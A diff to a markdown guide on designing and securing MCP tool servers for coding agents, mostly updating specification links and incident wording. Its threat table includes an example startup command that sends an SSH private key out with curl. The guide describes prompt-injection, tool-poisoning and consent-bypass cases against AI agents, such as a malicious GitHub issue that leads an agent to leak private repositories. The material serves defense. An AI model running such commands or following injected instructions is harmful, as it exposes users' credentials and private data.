@@ -157,7 +157,7 @@ tools.get_page.output_token_limit = 8000
 - **Practice:** build "a few thoughtful tools targeting specific high-impact workflows" instead of one tool per endpoint, namespaced under a service prefix.
 - **Why:** consolidated tools need fewer calls and less context; overlapping tools confuse selection.
 - **How:** `schedule_event` instead of `list_users` + `list_events` + `create_event`. Prefix related tools (`asana_search`, `jira_search`); whether prefix or suffix works better "varies by LLM", so test it. Tool names: 1–128 characters from `A-Za-z0-9_-.`, unique per server; return tools in a deterministic order (helps caching). Keep the server name stable: it becomes part of `mcp__<server>__<tool>`, which permission rules and hook matchers use.
-- **Evidence:** [Vendor, Sep 2025] ([Anthropic, Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents)); [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/draft/server/tools)). No vendor gives a number of tools per server beyond "few".
+- **Evidence:** [Vendor, Sep 2025] ([Anthropic, Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents)); [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)). No vendor gives a number of tools per server beyond "few".
 
 #### 8. Write descriptions for a new team member
 
@@ -175,15 +175,15 @@ tools.get_page.output_token_limit = 8000
   - Paginate, filter, select ranges and truncate with defaults; when truncating, tell the agent how to narrow the query.
   - For Claude Code, declare `anthropic/maxResultSizeChars` for inherently large outputs rather than asking users to raise `MAX_MCP_OUTPUT_TOKENS`. Send progress notifications so long calls do not hit idle timeouts (5 min HTTP, 30 min stdio).
   - Use `structuredContent` with an `outputSchema` where callers parse results; also return the JSON in a text block for compatibility. Return a `resource_link` instead of large content.
-  - For stateful tools, return an explicit opaque high-entropy handle (for example `basket_id`), re-authorize on every call, state the handle's lifetime in the description, and return a tool error on expiry. The draft spec has no protocol session.
-- **Evidence:** [Vendor, Sep 2025] ([Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)); [Vendor] ([Claude Code MCP](https://code.claude.com/docs/en/mcp)); [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/draft/server/tools)).
+  - For stateful tools, return an explicit opaque high-entropy handle (for example `basket_id`), re-authorize on every call, state the handle's lifetime in the description, and return a tool error on expiry. The 2026-07-28 specification has no protocol session; legacy revisions differ.
+- **Evidence:** [Vendor, Sep 2025] ([Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)); [Vendor] ([Claude Code MCP](https://code.claude.com/docs/en/mcp)); [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)).
 
 #### 10. Return actionable tool errors
 
 - **Practice:** report tool execution failures as results with `isError: true` and a message that names the fix.
 - **Why:** clients pass execution errors to the model, which can self-correct; opaque codes give it nothing to act on.
 - **How:** reserve JSON-RPC protocol errors for unknown tools and malformed requests. Example message: "Invalid departure date: must be in the future. Current date is 08/08/2025."
-- **Evidence:** [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/draft/server/tools)); [Vendor, Sep 2025] errors should be "clearly actionable improvements, rather than opaque error codes" ([Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)).
+- **Evidence:** [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)); [Vendor, Sep 2025] errors should be "clearly actionable improvements, rather than opaque error codes" ([Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)).
 
 #### 11. Authenticate with minimal scopes and no committed secrets
 
@@ -195,21 +195,21 @@ tools.get_page.output_token_limit = 8000
   - Start with a minimal scope (for example `mcp:tools-basic`) and step up via `WWW-Authenticate scope=`. Avoid wildcard or omnibus scopes and publishing every scope in `scopes_supported`.
   - Do not encode secrets as `x-mcp-header` parameters; do not put static API keys in `.mcp.json` or `config.toml`.
   - Claude Code sends OAuth credentials only to HTTPS or loopback token endpoints.
-- **Evidence:** [Vendor] ([MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)); [Vendor] ([Claude Code MCP](https://code.claude.com/docs/en/mcp)); [Vendor] ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)).
+- **Evidence:** [Vendor] ([MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)); [Vendor] ([Claude Code MCP](https://code.claude.com/docs/en/mcp)); [Vendor] ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)).
 
 Further server rules from the same sources:
 
-- **Transport:** use stdio or streamable HTTP. Codex supports only those; SSE is deprecated in Claude Code; WebSocket and SDK transports are Claude Code only ([MCP concept page](../concepts/mcp.md)). Local servers SHOULD use stdio; a local HTTP server must require an auth token or use a unix socket, to block DNS rebinding from browser pages ([MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)).
+- **Transport:** use stdio or streamable HTTP. Codex supports only those; SSE is deprecated in Claude Code; WebSocket and SDK transports are Claude Code only ([MCP concept page](../concepts/mcp.md)). Local servers SHOULD use stdio; a local HTTP server must require an auth token or use a unix socket, to block DNS rebinding from browser pages ([MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)).
 - **Server instructions:** keep the first 512 characters self-contained (Codex); Claude Code truncates at 2,048 ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli); [MCP concept page](../concepts/mcp.md)).
-- **Approval hints:** emit both `_meta["anthropic/requiresUserInteraction"]` (Claude Code) and a destructive annotation (Codex always asks for approval unless the tool also carries a read annotation) on destructive tools ([Codex security](https://learn.chatgpt.com/docs/agent-approvals-security); [MCP concept page](../concepts/mcp.md)). Clients MUST treat annotations as untrusted unless the server is trusted ([MCP spec, Tools](https://modelcontextprotocol.io/specification/draft/server/tools)).
-- **Server duties:** validate inputs, enforce access control, rate limit, sanitize outputs ([MCP spec, Tools](https://modelcontextprotocol.io/specification/draft/server/tools)).
+- **Approval hints:** emit both `_meta["anthropic/requiresUserInteraction"]` (Claude Code) and a destructive annotation (Codex always asks for approval unless the tool also carries a read annotation) on destructive tools ([Codex security](https://learn.chatgpt.com/docs/agent-approvals-security); [MCP concept page](../concepts/mcp.md)). Clients MUST treat annotations as untrusted unless the server is trusted ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)).
+- **Server duties:** validate inputs, enforce access control, rate limit, sanitize outputs ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)).
 
 ### Securing MCP
 
 #### 12. Allowlist servers by identity and pin versions
 
 - **Practice:** admins allowlist servers by command or URL, not only by name; users pin package versions.
-- **Why:** a name is not a security control. Unpinned `npx -y` / `uvx` runs the latest release in every session. `postmark-mcp` became malicious only from version 1.0.16, so an unpinned install picked up the change.
+- **Why:** a name is not a security control. Unpinned `npx -y` / `uvx` runs the latest release in every session. `postmark-mcp` added a backdoor in version 1.0.16; an unpinned installation can pick up such an update.
 - **How:**
   - Claude Code: `allowedMcpServers` / `deniedMcpServers` by `serverUrl` (wildcards), `serverCommand` or name; `managed-mcp.json` / `managedMcpServers` for exclusive control (an empty map disables MCP) ([Claude Code MCP](https://code.claude.com/docs/en/mcp)). `disableSideloadFlags` does not restrict `.mcp.json`, `claude mcp add` or SDK servers: "Pair it with `allowedMcpServers`". `strictPluginOnlyCustomization: ["mcp"]` blocks servers not from a plugin, managed settings or built-ins ([Claude Code plugins for orgs](https://code.claude.com/docs/en/plugins/org)).
   - Codex: `requirements.toml` `[mcp_servers.<id>] identity` by command or URL with exact, prefix or regex matchers; name and identity must both match; an empty table disables all servers; the same shapes apply to plugin servers ([Codex managed configuration](https://developers.openai.com/codex/enterprise/managed-configuration)).
@@ -220,14 +220,14 @@ Further server rules from the same sources:
 
 - **Practice:** do not give one session private data, untrusted content and a channel to send data out (the "lethal trifecta").
 - **Why:** injection through tool results works even when the server is clean: in the GitHub MCP "toxic agent flow", a malicious public issue led the agent to leak private repositories into a public PR ([Invariant Labs, GitHub MCP](https://invariantlabs.ai/blog/mcp-github-vulnerability), May 2025). Guardrails are not enough: "in web application security 95% is very much a failing grade".
-- **How:** run tools that read untrusted content (issues, web, email) in a [subagent](../concepts/subagents.md) or session without write or exfiltration tools. Set approval to `prompt` / `ask` for any tool that sends data out (PR creation, email, HTTP). Do not auto-approve write tools on servers that also read untrusted content.
+- **How:** run tools that read untrusted content (issues, web, email) in a [subagent](../concepts/subagents.md) or session without write or exfiltration tools. Set approval to `prompt` / `ask` for any tool that sends data out (PR creation, email, HTTP). Do not auto-approve write tools on servers that also read untrusted content. A read-only query is also outbound: exclude private data from this worker and constrain query arguments at the call boundary ([OpenAI deep research security](https://developers.openai.com/api/docs/guides/deep-research), [Vendor]; enforcement recommendation [Inference]).
 - **Evidence:** [Practitioner, Apr/Jun 2025] ([Willison, lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/); [Willison, MCP prompt injection](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/)); [Advisory] (Invariant, above). Pattern is an inference in the notes.
 
 #### 14. Review a third-party server before connecting it
 
 - **Practice:** read the source and the `tools/list` output, and re-review on every version bump.
 - **Why:** tool descriptions can carry hidden instructions (poisoning) and can change after approval (rug pull). Neither lead's fetched docs say whether the harness detects description changes after approval.
-- **How:** (1) read the source and the tool descriptions, looking for hidden or Unicode text; (2) check the publisher matches the official vendor (typosquats); (3) pin the version; (4) check the requested OAuth scopes; (5) diff `tools/list` on every update. One-click local installs must show the full command and get explicit consent ([MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)).
+- **How:** (1) read the source and the tool descriptions, looking for hidden or Unicode text; (2) check the publisher matches the official vendor (typosquats); (3) pin the version; (4) check the requested OAuth scopes; (5) diff `tools/list` on every update. One-click local installs must show the full command and get explicit consent ([MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)).
 - **Evidence:** [Vendor] "Verify you trust each server before connecting it. Servers that fetch external content can expose you to prompt injection risk" ([Claude Code MCP](https://code.claude.com/docs/en/mcp)); [Advisory] ([Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)). Procedure is an inference in the notes.
 
 #### 15. Evaluate tools with realistic tasks
@@ -256,7 +256,7 @@ Further server rules from the same sources:
 
 ## Security
 
-Threat model per server (inference in the notes): (1) is the code trustworthy (supply chain, local process); (2) are the descriptions trustworthy (poisoning, rug pull); (3) are the results trustworthy (injection from fetched content); (4) are the credentials scoped (confused deputy, broad tokens). Allowlisting covers (1) and part of (2). Only least privilege and splitting tool sets per session or subagent mitigate (3).
+Threat model per server (inference in the notes): (1) is the code trustworthy (supply chain, local process); (2) are the descriptions trustworthy (poisoning, rug pull); (3) are the results trustworthy (injection from fetched content); (4) are the credentials scoped (confused deputy, broad tokens). Allowlisting covers (1) and part of (2). Least privilege, separated data access and enforced outbound argument/destination checks reduce (3) (inference; [security guide](../guide/security.md#data-access-and-outbound-channels)). Read-only search still sends its arguments outside the session ([OpenAI deep research security](https://developers.openai.com/api/docs/guides/deep-research)).
 
 | Threat | What happens | Mitigation |
 | --- | --- | --- |
@@ -264,7 +264,7 @@ Threat model per server (inference in the notes): (1) is the code trustworthy (s
 | Rug pull | Server changes descriptions after approval | Pin versions; diff `tools/list` on update |
 | Shadowing | One server's description changes how the agent uses another server | Fewer servers per session; review descriptions |
 | Injection through results (GitHub MCP, May 2025) | Clean server, malicious content in fetched data drives the agent | Lethal-trifecta split; approval on outbound tools ([Invariant](https://invariantlabs.ai/blog/mcp-github-vulnerability)) |
-| Confused deputy in OAuth proxies | Static client ID plus DCR plus consent cookie lets an attacker reuse consent | Per-client consent, exact `redirect_uri`, single-use `state` ([MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)) |
+| Confused deputy in OAuth proxies | Static client ID plus DCR plus consent cookie lets an attacker reuse consent | Per-client consent, exact `redirect_uri`, single-use `state` ([MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)) |
 | SSRF through OAuth metadata URLs | Server points the client at internal addresses | Block private ranges and `169.254.0.0/16`, require HTTPS, validate redirects (same source) |
 | Malicious startup commands | `npx malicious-package && curl -d @~/.ssh/id_rsa ...` | Show full command, explicit consent, sandbox servers with minimal privileges (same source) |
 | `javascript:` authorization URLs | XSS or RCE in the client | Validate URL schemes (same source) |
@@ -279,7 +279,7 @@ Incidents and advisories:
 | 2025 | CVE-2025-49596, MCP Inspector < 0.14.1 [Advisory] | No auth between Inspector client and proxy; RCE over stdio ([SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-49596/)) |
 | 2025 | CVE-2025-58444, MCP Inspector, fixed 0.16.6 [Advisory] | XSS via a redirect URL from a malicious server, leading to command execution ([GitLab advisory](https://advisories.gitlab.com/npm/@modelcontextprotocol/inspector/CVE-2025-58444/)) |
 | Fixed 2025-08-20 | CVE-2025-61260, Codex CLI [Advisory] | A repository `.env` set `CODEX_HOME=./.codex`; project `mcp_servers` commands ran at startup without a prompt; CVSS 9.8; fixed in v0.23.0 ([Check Point](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/); [NVD](https://nvd.nist.gov/vuln/detail/cve-2025-61260)) |
-| 2025 | `postmark-mcp` on npm [Advisory] | First malicious MCP server found in use; since version 1.0.16 it BCC'd every email to the attacker; reported by Koi Security (Idan Dardikman) ([CSO Online](https://www.csoonline.com/article/4064009/trust-in-mcp-takes-first-in-the-wild-hit-via-squatted-postmark-connector.html)) |
+| 2025 | `postmark-mcp` on npm [Advisory] | An unofficial connector added an external BCC in 1.0.16 after building trust over 15 versions; Postmark's API was unaffected ([Postmark incident notice](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package)) |
 | Fixes 2025-08-26, 2025-09-22, 2025-12-28 | Claude Code project files, Check Point [Advisory] | CVE-2025-59536 RCE through hooks in repository `.claude/settings.json`; MCP consent bypass via `enableAllProjectMcpServers` / `enabledMcpjsonServers` in project settings; API key exfiltration via a project-set `ANTHROPIC_BASE_URL` before the trust dialog ([Check Point](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)) |
 
 Current harness behaviour to plan around:
@@ -327,6 +327,25 @@ Current harness behaviour to plan around:
 - No MCPTox-style attack-success data for 2026 Claude or GPT-5-class models.
 - Codex does not document whether a server defined in user and project config is replaced or merged per key ([MCP concept page](../concepts/mcp.md)).
 
+## Protocol revision and security checks
+
+[Specification] These references use MCP 2026-07-28, the
+[current revision](https://modelcontextprotocol.io/docs/2026-07-28/learn/versioning).
+They do not establish which revision a deployed harness negotiates.
+For HTTP, validate present Origin (invalid values receive 403); local
+binding and authentication add protection
+([transport](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)).
+Authorization also needs resource/audience binding, PKCE, response-issuer
+checks and per-client consent; discovery needs SSRF defenses
+([authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization),
+[security considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations),
+[security guidance](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)).
+
+The [security guide](../guide/security.md#mcp-authorization-and-transport)
+connects those requirements to deployment checks and historical SDK
+advisories. Do not conflate current application state handles with
+legacy protocol sessions.
+
 ## Sources
 
 - [Claude Code best practices](https://code.claude.com/docs/en/best-practices)
@@ -343,8 +362,8 @@ Current harness behaviour to plan around:
 - [Anthropic, Advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)
 - [Anthropic, Code execution with MCP](https://www.anthropic.com/engineering/code-execution-with-mcp)
 - [Cloudflare Code Mode](https://blog.cloudflare.com/code-mode/)
-- [MCP spec, Tools (draft)](https://modelcontextprotocol.io/specification/draft/server/tools)
-- [MCP Security Best Practices (draft)](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
+- [MCP spec, Tools (2026-07-28)](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)
+- [MCP Security Best Practices (2026-07-28)](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
 - [Zechner, MCP vs CLI](https://mariozechner.at/posts/2025-08-15-mcp-vs-cli/)
 - [Zechner, What if you don't need MCP at all?](https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/)
 - [Willison, Claude Skills](https://simonwillison.net/2025/Oct/16/claude-skills/)
@@ -359,7 +378,7 @@ Current harness behaviour to plan around:
 - [GitLab advisory CVE-2025-6514](https://advisories.gitlab.com/npm/mcp-remote/CVE-2025-6514/)
 - [SentinelOne CVE-2025-49596](https://www.sentinelone.com/vulnerability-database/cve-2025-49596/)
 - [GitLab advisory CVE-2025-58444](https://advisories.gitlab.com/npm/@modelcontextprotocol/inspector/CVE-2025-58444/)
-- [CSO Online, squatted Postmark connector](https://www.csoonline.com/article/4064009/trust-in-mcp-takes-first-in-the-wild-hit-via-squatted-postmark-connector.html)
+- [Postmark, unofficial malicious connector](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package)
 - [Check Point Research, Claude Code project files](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
 - [Check Point Research, Codex CLI](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/)
 - [NVD CVE-2025-61260](https://nvd.nist.gov/vuln/detail/cve-2025-61260)
